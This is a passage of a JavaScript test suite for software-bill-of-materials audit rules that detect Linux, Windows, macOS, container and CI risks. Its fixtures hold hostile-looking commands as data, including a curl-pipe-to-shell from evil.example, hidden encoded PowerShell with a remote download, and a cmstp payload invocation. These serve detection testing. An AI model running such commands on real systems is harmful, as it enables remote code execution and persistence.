        properties: [{ name: "cdx:osquery:category", value: "alf_exceptions" }],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect risky ALF exception path");
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect broad sudoers rule (OBOM-LNX-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-002");
    assert.ok(rule, "OBOM-LNX-002 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "admin-policy",
        version: "",
        description: "admin ALL=(ALL) NOPASSWD:ALL",
        purl: "pkg:swid/admin-policy",
        "bom-ref": "pkg:swid/admin-policy",
        properties: [
          { name: "cdx:osquery:category", value: "sudoers_snapshot" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect broad sudoers policy");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect ALL=(ALL) ALL sudoers rule (OBOM-LNX-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-002");
    assert.ok(rule, "OBOM-LNX-002 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "legacy-admin-policy",
        version: "",
        description: "admin ALL=(ALL) ALL",
        purl: "pkg:swid/legacy-admin-policy",
        "bom-ref": "pkg:swid/legacy-admin-policy",
        properties: [
          { name: "cdx:osquery:category", value: "sudoers_snapshot" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect ALL=(ALL) ALL sudoers policy",
    );
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect suspicious shell history commands (OBOM-LNX-004)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-004");
    assert.ok(rule, "OBOM-LNX-004 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "analyst",
        version: "",
        description: "curl http://evil.example/p.sh | sh",
        purl: "pkg:swid/analyst-shell-history",
        "bom-ref": "pkg:swid/analyst-shell-history",
        properties: [
          { name: "cdx:osquery:category", value: "shell_history_snapshot" },
          { name: "history_file", value: "/home/analyst/.bash_history" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect suspicious shell history");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect exposed docker daemon API (OBOM-LNX-005)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-005");
    assert.ok(rule, "OBOM-LNX-005 rule should exist");

    const bom = makeBom([
      makeComponent("dockerd", "2375", [
        ["cdx:osquery:category", "listening_ports"],
        ["address", "0.0.0.0"],
        ["port", "2375"],
        ["protocol", "6"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect exposed docker daemon API");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect setuid GTFOBins execution primitive (CTR-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CTR-001");
    assert.ok(rule, "CTR-001 rule should exist");

    const bom = makeBom([
      {
        type: "file",
        name: "bash",
        version: "",
        description: "",
        purl: "pkg:generic/bash",
        "bom-ref": "pkg:generic/bash",
        properties: [
          { name: "SrcFile", value: "/bin/bash" },
          { name: "internal:has_setuid", value: "true" },
          { name: "cdx:gtfobins:matched", value: "true" },
          { name: "cdx:gtfobins:name", value: "bash" },
          { name: "cdx:gtfobins:functions", value: "shell,command,upload" },
          { name: "cdx:gtfobins:contexts", value: "unprivileged,sudo,suid" },
          {
            name: "cdx:gtfobins:riskTags",
            value: "data-exfiltration,lateral-movement,privilege-escalation",
          },
          {
            name: "cdx:gtfobins:reference",
            value: "https://gtfobins.github.io/gtfobins/bash/",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect setuid GTFOBins primitive");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect privileged container-escape helper (CTR-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CTR-002");
    assert.ok(rule, "CTR-002 rule should exist");

    const bom = makeBom([
      {
        type: "file",
        name: "docker",
        version: "",
        description: "",
        purl: "pkg:generic/docker",
        "bom-ref": "pkg:generic/docker",
        properties: [
          { name: "SrcFile", value: "/usr/bin/docker" },
          { name: "cdx:gtfobins:matched", value: "true" },
          { name: "cdx:gtfobins:name", value: "docker" },
          { name: "cdx:gtfobins:functions", value: "shell,command" },
          {
            name: "cdx:gtfobins:privilegedContexts",
            value: "capabilities",
          },
          { name: "cdx:gtfobins:riskTags", value: "container-escape" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect privileged escape helper");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect privileged GTFOBins exfiltration primitive (CTR-004)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CTR-004");
    assert.ok(rule, "CTR-004 rule should exist");

    const bom = makeBom([
      {
        type: "file",
        name: "bash",
        version: "",
        description: "",
        purl: "pkg:generic/bash",
        "bom-ref": "pkg:generic/bash",
        properties: [
          { name: "SrcFile", value: "/usr/bin/bash" },
          { name: "internal:has_setgid", value: "true" },
          { name: "cdx:gtfobins:matched", value: "true" },
          { name: "cdx:gtfobins:name", value: "bash" },
          { name: "cdx:gtfobins:functions", value: "shell,file-read,upload" },
          { name: "cdx:gtfobins:privilegedContexts", value: "suid" },
          {
            name: "cdx:gtfobins:riskTags",
            value: "data-exfiltration,privilege-escalation",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect privileged GTFOBins exfiltration helper",
    );
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect privileged GTFOBins library-load primitive (CTR-003)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CTR-003");
    assert.ok(rule, "CTR-003 rule should exist");

    const bom = makeBom([
      {
        type: "file",
        name: "bash",
        version: "",
        description: "",
        purl: "pkg:generic/bash",
        "bom-ref": "pkg:generic/bash",
        properties: [
          { name: "SrcFile", value: "/bin/bash" },
          { name: "cdx:gtfobins:matched", value: "true" },
          { name: "cdx:gtfobins:name", value: "bash" },
          {
            name: "cdx:gtfobins:functions",
            value: "shell,library-load,privilege-escalation",
          },
          {
            name: "cdx:gtfobins:privilegedContexts",
            value: "sudo,suid",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect privileged GTFOBins library-load helper",
    );
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect mutable-path GTFOBins remote execution helper (CTR-005)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CTR-005");
    assert.ok(rule, "CTR-005 rule should exist");

    const bom = makeBom([
      {
        type: "file",
        name: "bash",
        version: "",
        description: "",
        purl: "pkg:generic/bash",
        "bom-ref": "pkg:generic/bash",
        properties: [
          { name: "SrcFile", value: "/usr/local/bin/bash" },
          { name: "cdx:gtfobins:matched", value: "true" },
          { name: "cdx:gtfobins:name", value: "bash" },
          { name: "cdx:gtfobins:functions", value: "shell,upload,download" },
          {
            name: "cdx:gtfobins:riskTags",
            value: "data-exfiltration,lateral-movement",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect mutable-path GTFOBins helper",
    );
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect dedicated offensive container toolkits (CTR-006)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CTR-006");
    assert.ok(rule, "CTR-006 rule should exist");

    const bom = makeBom([
      {
        type: "file",
        name: "deepce",
        version: "",
        description: "",
        purl: "pkg:generic/deepce",
        "bom-ref": "pkg:generic/deepce",
        properties: [
          { name: "SrcFile", value: "/usr/local/bin/deepce" },
          { name: "cdx:container:matched", value: "true" },
          { name: "cdx:container:name", value: "deepce" },
          { name: "cdx:container:offenseTools", value: "deepce" },
          {
            name: "cdx:container:riskTags",
            value: "container-escape,credential-access,offensive-toolkit",
          },
          {
            name: "cdx:container:attackTechniques",
            value: "T1552.007,T1611,T1613",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect offensive toolkit presence");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect seccomp-sensitive namespace escape helpers (CTR-007)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CTR-007");
    assert.ok(rule, "CTR-007 rule should exist");

    const bom = makeBom([
      {
        type: "file",
        name: "nsenter",
        version: "",
        description: "",
        purl: "pkg:generic/nsenter",
        "bom-ref": "pkg:generic/nsenter",
        properties: [
          { name: "SrcFile", value: "/usr/bin/nsenter" },
          { name: "cdx:container:matched", value: "true" },
          { name: "cdx:container:name", value: "nsenter" },
          { name: "cdx:container:offenseTools", value: "cdk,deepce" },
          {
            name: "cdx:container:riskTags",
            value: "container-escape,namespace-escape",
          },
          {
            name: "cdx:container:seccompBlockedSyscalls",
            value: "ptrace,setns,unshare",
          },
          { name: "cdx:container:seccompProfile", value: "docker-default" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect seccomp-sensitive escape helper",
    );
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect privileged listener exposed on all interfaces (OBOM-LNX-006)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-006");
    assert.ok(rule, "OBOM-LNX-006 rule should exist");

    const bom = makeBom([
      {
        type: "application",
        name: "cockpit-ws",
        version: "9090",
        description: "",
        purl: "pkg:swid/cockpit-ws@9090",
        "bom-ref": "pkg:swid/cockpit-ws@9090",
        properties: [
          { name: "cdx:osquery:category", value: "privileged_listening_ports" },
          { name: "account", value: "root" },
          { name: "address", value: "0.0.0.0" },
          { name: "port", value: "9090" },
          { name: "path", value: "/usr/libexec/cockpit-ws" },
          { name: "service_unit", value: "cockpit.socket" },
          { name: "package_source_hint", value: "system-package-path" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect privileged listener risk");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect interactive sudo execution of package tooling (OBOM-LNX-008)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-008");
    assert.ok(rule, "OBOM-LNX-008 rule should exist");

    const bom = makeBom([
      {
        type: "application",
        name: "sudo",
        version: "4242",
        description: "",
        purl: "pkg:swid/sudo@4242",
        "bom-ref": "pkg:swid/sudo@4242",
        properties: [
          { name: "cdx:osquery:category", value: "sudo_executions" },
          { name: "auid", value: "1000" },
          { name: "euid", value: "0" },
          { name: "login_user", value: "analyst" },
          { name: "effective_user", value: "root" },
          { name: "path", value: "/usr/bin/sudo" },
          {
            name: "cmdline",
            value: "sudo pkcon refresh force",
          },
          { name: "parent_cmdline", value: "/bin/bash" },
          { name: "time", value: "1714212000" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect interactive privileged package tooling",
    );
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect unexpected privilege transition (OBOM-LNX-009)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-009");
    assert.ok(rule, "OBOM-LNX-009 rule should exist");

    const bom = makeBom([
      {
        type: "application",
        name: "packagekit-helper",
        version: "2121",
        description: "",
        purl: "pkg:swid/packagekit-helper@2121",
        "bom-ref": "pkg:swid/packagekit-helper@2121",
        properties: [
          { name: "cdx:osquery:category", value: "privilege_transitions" },
          { name: "auid", value: "1000" },
          { name: "uid", value: "1000" },
          { name: "euid", value: "0" },
          { name: "gid", value: "1000" },
          { name: "egid", value: "0" },
          { name: "login_user", value: "analyst" },
          { name: "path", value: "/usr/libexec/packagekit-direct" },
          {
            name: "cmdline",
            value: "/usr/libexec/packagekit-direct --repair",
          },
          { name: "parent_cmdline", value: "/bin/bash" },
          { name: "package_source_hint", value: "unclassified-path" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect unexpected privilege transition",
    );
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect hidden suspicious Windows scheduled task (OBOM-WIN-004)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-004");
    assert.ok(rule, "OBOM-WIN-004 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "WindowsUpdateTask",
        version: "",
        description: "",
        purl: "pkg:swid/windows-task",
        "bom-ref": "pkg:swid/windows-task",
        properties: [
          { name: "cdx:osquery:category", value: "scheduled_tasks" },
          { name: "enabled", value: "1" },
          { name: "hidden", value: "1" },
          { name: "path", value: "C:\\Users\\Public\\Temp\\u.exe" },
          {
            name: "action",
            value: "powershell -enc SQBFAFgAIAAoAEkAbgB2AG8AawBlACkA",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect suspicious hidden task");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect auto-start service in user-writable path (OBOM-WIN-005)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-005");
    assert.ok(rule, "OBOM-WIN-005 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "EvilAutoStartService",
        version: "",
        description: "",
        purl: "pkg:swid/windows-service-evil",
        "bom-ref": "pkg:swid/windows-service-evil",
        properties: [
          { name: "cdx:osquery:category", value: "services_snapshot" },
          { name: "start_type", value: "AUTO_START" },
          {
            name: "path",
            value:
              "C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\evil.exe",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect auto-start service risk");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect Windows persistence surfaces referencing LOLBAS (OBOM-WIN-006)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-006");
    assert.ok(rule, "OBOM-WIN-006 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
        version: "",
        description: "powershell.exe -nop -w hidden -enc AAAA",
        purl: "pkg:swid/windows-run-key-lolbas",
        "bom-ref": "pkg:swid/windows-run-key-lolbas",
        properties: [
          { name: "cdx:osquery:category", value: "windows_run_keys" },
          { name: "cdx:lolbas:matched", value: "true" },
          { name: "cdx:lolbas:names", value: "powershell.exe" },
          {
            name: "cdx:lolbas:functions",
            value: "command,download,script-execution,shell,upload",
          },
          { name: "cdx:lolbas:matchFields", value: "description" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect LOLBAS persistence surface");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect WMI or AppCompat LOLBAS persistence (OBOM-WIN-007)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-007");
    assert.ok(rule, "OBOM-WIN-007 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "CommandLineEventConsumerBad",
        version: "",
        description: "",
        purl: "pkg:swid/windows-wmi-lolbas",
        "bom-ref": "pkg:swid/windows-wmi-lolbas",
        properties: [
          { name: "cdx:osquery:category", value: "wmi_cli_event_consumers" },
          { name: "cdx:lolbas:matched", value: "true" },
          { name: "cdx:lolbas:names", value: "regsvr32.exe" },
          {
            name: "cdx:lolbas:functions",
            value: "library-load,proxy-execution,script-execution",
          },
          {
            name: "command_line_template",
            value: "regsvr32.exe /s scrobj.dll",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect LOLBAS WMI persistence");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect network-capable LOLBAS in startup or process activity (OBOM-WIN-008)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-008");
    assert.ok(rule, "OBOM-WIN-008 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "SuspiciousPowerShell",
        version: "",
        description: "",
        purl: "pkg:swid/windows-process-lolbas",
        "bom-ref": "pkg:swid/windows-process-lolbas",
        properties: [
          { name: "cdx:osquery:category", value: "processes" },
          { name: "cdx:lolbas:matched", value: "true" },
          { name: "cdx:lolbas:names", value: "powershell.exe" },
          {
            name: "cdx:lolbas:functions",
            value: "command,download,script-execution,shell,upload",
          },
          {
            name: "cmdline",
            value:
              "powershell.exe -nop -w hidden -enc AAAA; iwr https://evil.example/a.ps1",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect network-capable LOLBAS");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect network-facing LOLBAS listeners (OBOM-WIN-009)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-009");
    assert.ok(rule, "OBOM-WIN-009 rule should exist");

    const bom = makeBom([
      {
        type: "application",
        name: "powershell.exe",
        version: "9001",
        description: "",
        purl: "pkg:swid/powershell.exe@9001",
        "bom-ref": "pkg:swid/powershell.exe@9001",
        properties: [
          { name: "cdx:osquery:category", value: "listening_ports" },
          { name: "cdx:lolbas:matched", value: "true" },
          { name: "cdx:lolbas:names", value: "powershell.exe" },
          {
            name: "cdx:lolbas:functions",
            value: "command,download,script-execution,shell,upload",
          },
          { name: "address", value: "0.0.0.0" },
          { name: "port", value: "9001" },
          {
            name: "cmdline",
            value: "powershell.exe -nop -w hidden -enc AAAA",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect network-facing LOLBAS");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect UAC-bypass-capable LOLBAS persistence (OBOM-WIN-010)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-010");
    assert.ok(rule, "OBOM-WIN-010 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "BadTask",
        version: "",
        description: "",
        purl: "pkg:swid/windows-task-uac-lolbas",
        "bom-ref": "pkg:swid/windows-task-uac-lolbas",
        properties: [
          { name: "cdx:osquery:category", value: "scheduled_tasks" },
          { name: "cdx:lolbas:matched", value: "true" },
          { name: "cdx:lolbas:names", value: "cmstp.exe" },
          { name: "cdx:lolbas:contexts", value: "admin,uac-bypass,user" },
          { name: "action", value: "cmstp.exe /s payload.inf" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect UAC-bypass LOLBAS");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect launchd override disabling Apple service (OBOM-MAC-004)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-MAC-004");
    assert.ok(rule, "OBOM-MAC-004 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "com.apple.some-security-service",
        version: "",
        description: "",
        purl: "pkg:swid/launchd-override",
        "bom-ref": "pkg:swid/launchd-override",
        properties: [
          { name: "cdx:osquery:category", value: "launchd_overrides" },
          { name: "label", value: "com.apple.some-security-service" },
          { name: "key", value: "Disabled" },
          { name: "value", value: "1" },
          { name: "uid", value: "0" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect disabled Apple launchd label",
    );
    assert.strictEqual(findings[0].severity, "medium");
  });
});

describe("evaluateRules", () => {
  it("should sort findings by severity (high before medium before low)", async () => {
    const rules = await loadRules(RULES_DIR);
    const bom = makeBom([
      makeComponent("actions/checkout", "v3", [
        ["cdx:github:action:isShaPinned", "false"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/checkout@v3"],
        ["cdx:github:action:versionPinningType", "tag"],
      ]),
      makeComponent("deprecated-go-mod", "1.0.0", [
        ["cdx:go:deprecated", "use other-module instead"],
      ]),
    ]);

    const findings = await evaluateRules(rules, bom);
    if (findings.length >= 2) {
      const severityOrder = { critical: 0, high: 1, medium: 2, low: 3 };
      for (let i = 1; i < findings.length; i++) {
        const prev = severityOrder[findings[i - 1].severity] ?? 4;
        const curr = severityOrder[findings[i].severity] ?? 4;
        assert.ok(
          prev <= curr,
          `Finding ${i - 1} severity (${findings[i - 1].severity}) should be >= severity of finding ${i} (${findings[i].severity})`,
        );
      }
    }
  });
});

describe("auditBom", () => {
  it("should run audit and return findings", async () => {
    const bom = makeBom([
      makeComponent("actions/setup-node", "v3", [
        ["cdx:github:action:isShaPinned", "false"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/setup-node@v3"],
        ["cdx:github:action:versionPinningType", "tag"],
      ]),
    ]);

    const findings = await auditBom(bom, {});
    assert.ok(findings.length > 0, "Should find at least one issue");
  });

  it("should return empty array for null bom", async () => {
    const findings = await auditBom(null, {});
    assert.deepStrictEqual(findings, []);
  });

  it("should filter by category", async () => {
    const bom = makeBom([
      makeComponent("actions/setup-node", "v3", [
        ["cdx:github:action:isShaPinned", "false"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/setup-node@v3"],
        ["cdx:github:action:versionPinningType", "tag"],
      ]),
      makeComponent("sketchy-pkg", "1.0.0", [
        ["cdx:npm:hasInstallScript", "true"],
        ["cdx:npm:isRegistryDependency", "false"],
      ]),
    ]);

    const ciOnly = await auditBom(bom, {
      bomAuditCategories: "ci-permission",
    });
    for (const f of ciOnly) {
      assert.strictEqual(f.category, "ci-permission");
    }
  });

  it("should filter by minimum severity", async () => {
    const bom = makeBom([
      makeComponent("actions/setup-node", "v3", [
        ["cdx:github:action:isShaPinned", "false"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/setup-node@v3"],
        ["cdx:github:action:versionPinningType", "tag"],
      ]),
    ]);

    const highOnly = await auditBom(bom, {
      bomAuditMinSeverity: "high",
    });
    for (const f of highOnly) {
      assert.strictEqual(f.severity, "high");
    }
  });

  it("does not flag CI-006 for a safe content-addressed PR cache workflow", async () => {
    const bom = makeBomFromWorkflowFixture("cache-pull-request.yml");

    const findings = await auditBom(bom, {
      bomAuditCategories: "ci-permission",
    });
    assert.ok(
      !findings.some((finding) => finding.ruleId === "CI-006"),
      "safe PR cache workflow should not trigger CI-006",
    );
  });

  it("flags CI-006 for a risky PR cache workflow", async () => {
    const bom = makeBomFromWorkflowFixture("risk-cache-poisoning.yml");

    const findings = await auditBom(bom, {
      bomAuditCategories: "ci-permission",
    });
    assert.ok(
      findings.some((finding) => finding.ruleId === "CI-006"),
      "risky PR cache workflow should trigger CI-006",
    );
  });

  it("does not flag high-risk-trigger rules for a safe push workflow", async () => {
    const bom = makeBomFromWorkflowFixture("trigger-safe-push.yml");

    const findings = await auditBom(bom, {
      bomAuditCategories: "ci-permission",
    });
    assert.ok(
      !findings.some((finding) =>
        ["CI-004", "CI-008", "CI-013"].includes(finding.ruleId),
      ),
      "safe push workflow should not trigger high-risk-trigger rules",
    );
  });

  it("preserves workflow_call producer metadata without triggering unrelated CI findings", async () => {
    const bom = makeBomFromWorkflowFixture("workflow-call-producer-safe.yml");

    const workflow = bom.formulation[0].workflows[0];
    const workflowProps = workflow.properties || [];
    assert.ok(
      workflowProps.some(
        (prop) =>
          prop.name === "cdx:github:workflow:hasWorkflowCallTrigger" &&
          prop.value === "true",
      ),
    );
    assert.ok(
      workflowProps.some(
        (prop) =>
          prop.name === "cdx:github:workflow:workflowCallInputs" &&
          prop.value === "target",
      ),
    );

    const findings = await auditBom(bom, {
      bomAuditCategories: "ci-permission",
    });
    assert.ok(
      !findings.some((finding) => finding.ruleId === "CI-011"),
      "producer-side reusable workflow metadata should not be confused with external reusable workflow invocation",
    );
    assert.ok(
      !findings.some((finding) =>
        ["CI-016", "CI-017"].includes(finding.ruleId),
      ),
      "safe workflow_call producer should not trigger privileged producer rules",
    );
  });

  it("flags risky workflow_call producers with privileged producer rules", async () => {
    const bom = makeBomFromWorkflowFixture("workflow-call-producer-risky.yml");

    const findings = await auditBom(bom, {
      bomAuditCategories: "ci-permission",
    });
    assert.ok(
      findings.some((finding) => finding.ruleId === "CI-016"),
      "risky workflow_call producer should trigger CI-016",
    );
    assert.ok(
      findings.some((finding) => finding.ruleId === "CI-017"),
      "risky workflow_call producer should trigger CI-017",
    );
  });

  it("flags workflow-dispatch chains in fork-reachable privileged workflows", async () => {
    const bom = makeBomFromWorkflowFixture("dispatch-chain-fork-sensitive.yml");

    const findings = await auditBom(bom, {
      bomAuditCategories: "ci-permission",
    });
    assert.ok(
      findings.some((finding) => finding.ruleId === "CI-018"),
      "fork-reachable dispatch chain should trigger CI-018",
    );
    assert.ok(
      findings.some((finding) => finding.ruleId === "CI-019"),
      "explicit fork-aware dispatch chain should trigger CI-019",
    );
  });

  it("prefers local receiver workflow names in CI-019 findings when correlation exists", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((candidate) => candidate.id === "CI-019");
    assert.ok(rule, "CI-019 rule should exist");

    const bom = makeBom([
      makeComponent("dispatch-step", "1.0.0", [
        ["cdx:github:step:dispatchesWorkflow", "true"],
        ["cdx:github:step:referencesForkContext", "true"],
        ["cdx:github:step:referencesSensitiveContext", "true"],
        ["cdx:github:step:dispatchTargets", "workflow:release.yml"],
        ["cdx:github:step:hasLocalDispatchReceiver", "true"],
        ["cdx:github:step:dispatchReceiverWorkflowNames", "Release workflow"],
        [
          "cdx:github:step:dispatchReceiverWorkflowFiles",
          ".github/workflows/release.yml",
        ],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "CI-019 should match the correlated dispatch step",
    );
    assert.match(findings[0].message, /Release workflow/);
    assert.doesNotMatch(findings[0].message, /workflow:release\.yml/);
  });

  it("flags obfuscated npm lifecycle hooks", async () => {
    const bom = makeBom([
      makeComponent("suspicious-pkg", "1.0.0", [
        ["cdx:npm:hasInstallScript", "true"],
        ["cdx:npm:hasObfuscatedLifecycleScript", "true"],
        ["cdx:npm:obfuscatedLifecycleScripts", "postinstall"],
        [
          "cdx:npm:lifecycleObfuscationIndicators",
          "ast:buffer-base64,long-base64-literal",
        ],
        ["cdx:npm:lifecycleExecutionIndicators", "ast:child-process"],
      ]),
    ]);

    const findings = await auditBom(bom, {
      bomAuditCategories: "package-integrity",
    });
    assert.ok(
      findings.some((finding) => finding.ruleId === "INT-009"),
      "obfuscated lifecycle hooks should trigger INT-009",
    );
  });

  it("does not flag CI-015 for low-signal outbound workflow steps", async () => {
    const bom = makeBomFromWorkflowFixture(
      "outbound-sensitive-context-low-signal.yml",
    );

    const findings = await auditBom(bom, {
      bomAuditCategories: "ci-permission",
    });
    assert.ok(
      !findings.some((finding) => finding.ruleId === "CI-015"),
      "low-signal outbound workflow should not trigger CI-015",
    );
  });

  it("flags CI-021 for a high-risk workflow with implicit permissions and sensitive operations", async () => {
    const bom = makeBomFromWorkflowFixture(
      "heuristic-implicit-permissions-sensitive.yml",
    );

    const findings = await auditBom(bom, {
      bomAuditCategories: "ci-permission",
    });
    assert.ok(
      findings.some((finding) => finding.ruleId === "CI-021"),
      "implicit-permissions high-risk workflow should trigger CI-021",
    );
  });

  it("does not flag CI-021 when the workflow declares an explicit permissions block", async () => {
    const bom = makeBomFromWorkflowFixture(
      "heuristic-explicit-permissions-sensitive.yml",
    );

    const findings = await auditBom(bom, {
      bomAuditCategories: "ci-permission",
    });
    assert.ok(
      !findings.some((finding) => finding.ruleId === "CI-021"),
      "explicit permissions block should suppress heuristic CI-021",
    );
  });
});

describe("formatAnnotations", () => {
  it("should create CycloneDX annotations from findings", () => {
    const bom = makeBom([]);
    const findings = [
      {
        ruleId: "CI-001",
        name: "Unpinned action",
        severity: "high",
        category: "ci-permission",
        message: "Unpinned GitHub Action detected",
        mitigation: "Pin to SHA",
        attackTactics: ["TA0001", "TA0004"],
        attackTechniques: ["T1195.001"],
      },
    ];
    const annotations = formatAnnotations(findings, bom);
    assert.strictEqual(annotations.length, 1);
    assert.ok(
      annotations[0].text.startsWith("Unpinned GitHub Action detected"),
    );
    assert.match(annotations[0].text, /\| Property \| Value \|/);
    assert.match(annotations[0].text, /cdx:audit:attack:tactics/);
    assert.match(annotations[0].text, /cdx:audit:attack:techniques/);
    assert.ok(
      annotations[0].annotator.component,
      "Annotation should have annotator component",
    );
    assert.ok(annotations[0].subjects.includes(bom.serialNumber));
  });

  it("should return empty array when cdxgen tool component is missing", () => {
    const bom = {
      serialNumber: "urn:uuid:test",
      metadata: { tools: { components: [] } },
      components: [],
    };
    const findings = [
      {
        ruleId: "CI-001",
        severity: "high",
        category: "ci-permission",
        message: "test",
      },
    ];
    const annotations = formatAnnotations(findings, bom);
    assert.deepStrictEqual(annotations, []);
  });

  it("should return empty array when metadata.tools is undefined", () => {
    const bom = {
      serialNumber: "urn:uuid:test",
      metadata: {},
      components: [],
    };
    const annotations = formatAnnotations(
      [{ ruleId: "X", severity: "low", category: "test", message: "test" }],
      bom,
    );
    assert.deepStrictEqual(annotations, []);
  });
});

describe("hasCriticalFindings", () => {
